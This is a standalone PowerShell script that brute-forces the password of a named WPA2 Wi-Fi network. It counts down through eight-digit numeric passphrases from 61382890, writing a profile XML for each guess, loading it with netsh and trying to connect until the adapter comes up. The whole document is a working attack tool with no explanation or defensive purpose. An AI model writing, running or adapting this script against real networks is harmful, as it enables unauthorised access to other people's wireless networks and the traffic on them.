$name=Read-Host -Prompt "what is the name";

$hex=("$name" | Format-Hex).HexBytes;
$password=61382890;
New-Item "Wi-Fi-$name.xml";
while($password -gt 10000000)
{
netsh wlan delete profile "$name";
    $content = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
	<name>$name</name>
	<SSIDConfig>
		<SSID>
			<hex>$hex</hex>
			<name>$name</name>
		</SSID>
	</SSIDConfig>
	<connectionType>ESS</connectionType>
	<connectionMode>auto</connectionMode>
	<MSM>
		<security>
			<authEncryption>
				<authentication>WPA2PSK</authentication>
				<encryption>AES</encryption>
				<useOneX>false</useOneX>
			</authEncryption>
			<sharedKey>
				<keyType>passPhrase</keyType>
				<protected>false</protected>
				<keyMaterial>$password</keyMaterial>
			</sharedKey>
		</security>
	</MSM>
	<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
		<enableRandomization>false</enableRandomization>
	</MacRandomization>
</WLANProfile>
"@;

Set-Content "Wi-Fi-$name.xml" $content;
netsh wlan add profile filename=".\Wi-Fi-$name.xml";
netsh wlan connect name=$name;
Start-Sleep 0.634;
if ((Get-NetAdapter -Name wi-fi).Status -eq "Up"){
	break
}
Write-Host;
Write-Host $password;
Write-Host;
$password--
}


